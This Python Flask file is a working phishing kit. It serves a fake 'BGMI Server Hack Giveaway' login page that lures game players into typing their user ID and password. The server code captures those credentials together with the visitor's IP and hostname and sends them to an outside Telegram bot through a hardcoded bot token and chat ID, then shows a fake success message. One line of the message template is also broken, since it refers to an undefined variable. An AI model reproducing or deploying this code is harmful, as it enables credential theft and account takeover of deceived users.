from flask import Flask, render_template_string, request
import requests
import socket
from datetime import datetime

app = Flask(__name__)

# Telegram Bot Configuration
BOT_TOKEN = "8680791781:AAE5GcIpECMWSoCc88fqZxRKsMBRb5StoOI"
CHAT_ID = "8022132284"

def get_client_ip():
    return request.remote_addr

def get_user_ip_info(ip):
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        return f"IP: {ip} | Hostname: {hostname}"
    except:
        return f"IP: {ip}"

def send_to_telegram(user_id, password, ip_info):
    message = f"""
🟢 BGMI LOGIN CREDENTIALS CAPTURED! 🟢

👤 User ID: `{Mobilenumber or email}`
🔑 Password: `{password}`
🌐 {ip_info}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

#BGMI #Hack #Login
"""
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, data=data)

# BGMI Server Hack Giveaway - Exact Login Page HTML
LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BGMI Server Hack Giveaway | Official Login</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Orbitron', monospace;
            background: linear-gradient(45deg, #0f0f23, #1a1a3e, #16213e, #0f3460);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
        }
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, rgba(120,119,198,0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255,119,198,0.3) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(120,219,255,0.3) 0%, transparent 50%);
            animation: float 6s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(1deg); }
        }
        .container {
            background: rgba(15, 15, 35, 0.95);
            backdrop-filter: blur(20px);
            border: 2px solid rgba(120, 119, 198, 0.3);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 25px 45px rgba(0,0,0,0.5);
            position: relative;
            z-index: 1;
            max-width: 400px;
            width: 90%;
            animation: slideIn 1s ease-out;
        }
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #00ff88;
            font-size: 28px;
            font-weight: 900;
            text-shadow: 0 0 20px #00ff88;
            margin-bottom: 10px;
        }
        .logo p {
            color: #a0a0ff;
            font-size: 14px;
            font-weight: 400;
        }
        .form-group {
            margin-bottom: 25px;
            position: relative;
        }
        .form-group input {
            width: 100%;
            padding: 15px 20px;
            background: rgba(30, 30, 60, 0.8);
            border: 2px solid rgba(120, 119, 198, 0.3);
            border-radius: 12px;
            color: #ffffff;
            font-family: 'Orbitron', monospace;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        .form-group input:focus {
            outline: none;
            border-color: #00ff88;
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
            background: rgba(30, 30, 60, 1);
        }
        .form-group input::placeholder {
            color: #8888aa;
        }
        .login-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #00ff88, #00cc6a);
            border: none;
            border-radius: 12px;
            color: #0f0f23;
            font-family: 'Orbitron', monospace;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.4);
        }
        .login-btn:active {
            transform: translateY(0);
        }
        .login-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s;
        }
        .login-btn:hover::before {
            left: 100%;
        }
        .footer {
            text-align: center;
            margin-top: 25px;
            color: #8888aa;
            font-size: 12px;
        }
        .success {
            display: none;
            text-align: center;
            color: #00ff88;
            font-size: 18px;
            margin-top: 20px;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        .particles {
            position: absolute;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 0;
        }
        .particle {
            position: absolute;
            background: rgba(0, 255, 136, 0.5);
            border-radius: 50%;
            pointer-events: none;
            animation: float 8s linear infinite;
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    <div class="container">
        <div class="logo">
            <h1>🔥 BGMI SERVER HACK</h1>
            <p>Official Giveaway Login Portal</p>
        </div>
        
        <form id="loginForm" method="POST" action="/">
            <div class="form-group">
                <input type="text" name="user_id" placeholder="Enter BGMI User ID" required autocomplete="off">
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Enter Password" required autocomplete="off">
            </div>
            <button type="submit" class="login-btn">🚀 LOGIN & CLAIM HACK</button>
        </form>
        
        <div id="successMsg" class="success">
            ✅ Login Successful! Hack Activated...
        </div>
        
        <div class="footer">
            Official BGMI Server Hack Team © 2026
        </div>
    </div>

    <script>
        // Particle Animation
        function createParticle() {
            const particle = document.createElement('div');
            particle.className = 'particle';
            particle.style.left = Math.random() * 100 + '%';
            particle.style.top = Math.random() * 100 + '%';
            particle.style.width = Math.random() * 4 + 2 + 'px';
            particle.style.height = particle.style.width;
            particle.style.animationDuration = Math.random() * 3 + 2 + 's';
            document.getElementById('particles').appendChild(particle);
            
            setTimeout(() => {
                particle.remove();
            }, 8000);
        }
        
        setInterval(createParticle, 300);

        // Form Success Animation
        document.getElementById('loginForm').addEventListener('submit', function() {
            setTimeout(() => {
                document.getElementById('successMsg').style.display = 'block';
            }, 1000);
        });
    </script>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user_id = request.form.get('user_id', 'N/A')
        password = request.form.get('password', 'N/A')
        client_ip = get_client_ip()
        ip_info = get_user_ip_info(client_ip)
        
        # Send to Telegram
        send_to_telegram(user_id, password, ip_info)
        
        return LOGIN_PAGE.replace('action="/"', 'action="/" style="pointer-events: none;"'), 200
    
    return LOGIN_PAGE, 200

if __name__ == '__main__':
    print("🚀 BGMI Server Hack Login Page Started!")
    print("📱 Credentials will be sent to your Telegram bot")
    app.run(host='0.0.0.0', port=5000, debug=False)
